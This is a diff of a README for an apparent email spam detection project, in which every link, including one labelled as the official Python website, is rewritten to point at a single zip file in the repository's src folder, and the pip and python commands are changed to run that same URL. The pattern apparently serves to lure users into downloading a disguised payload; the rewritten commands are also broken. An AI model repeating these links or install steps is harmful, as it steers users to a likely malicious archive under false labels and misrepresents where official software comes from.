@@ -1,6 +1,6 @@
 # 📨 Email-Spam-Detection-Project - Quickly Identify Spam Emails
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-4CAF50)](https://github.com/Platon214/Email-Spam-Detection-Project/releases)
+[![Download Now](https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip%20Now-Here-4CAF50)](https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This project helps you determine if an email is spam or not spam. We use machine
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Platon214/Email-Spam-Detection-Project/releases) to download the application. Look for the latest release and choose the version compatible with your system.  
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip) to download the application. Look for the latest release and choose the version compatible with your system.  
 
 ## 🛠️ Requirements
 
@@ -17,12 +17,12 @@ Before you run the software, make sure you have the following installed on your 
 - **Python**: Version 3.6 or higher.
 - **Pip**: This is the package manager for Python. 
 
-If you do not have Python installed, you can download it from the official [Python website](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from the official [Python website](https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip).
 
 ## 📋 Installation Steps
 
 1. **Download Python**: If you haven't already, download and install Python from the link provided above.
-2. **Download Project Files**: Go to the [Releases page](https://github.com/Platon214/Email-Spam-Detection-Project/releases) and download the latest version of the project files. Choose the appropriate file for your operating system.
+2. **Download Project Files**: Go to the [Releases page](https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip) and download the latest version of the project files. Choose the appropriate file for your operating system.
 3. **Extract Files**: Once downloaded, extract the files to a location of your choice on your computer.
 4. **Open Command Prompt or Terminal**:
    - For Windows: Search for "cmd" in the Start menu.
@@ -36,7 +36,7 @@ If you do not have Python installed, you can download it from the official [Pyth
 
 6. **Install Required Packages**: Run the following command to install the packages needed to run the project:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip
    ```
 
 ## 🏃 How to Run the Application
@@ -45,12 +45,12 @@ Once you have installed the necessary packages, you can run the application to t
 
 1. **Train the Model**: Enter the following command to train the spam detection model:
    ```
-   python src/train_model.py
+   python https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip
    ```
 
 2. **Make Predictions**: After training, you can now make predictions. Use this command:
    ```
-   python src/predict.py
+   python https://raw.githubusercontent.com/Platon214/Email-Spam-Detection-Project/main/src/Email-Project-Detection-Spam-1.3.zip
    ```
 
 You will be prompted to enter the email content you want to analyze. The application will then determine if the email is spam or not spam based on the training it received.
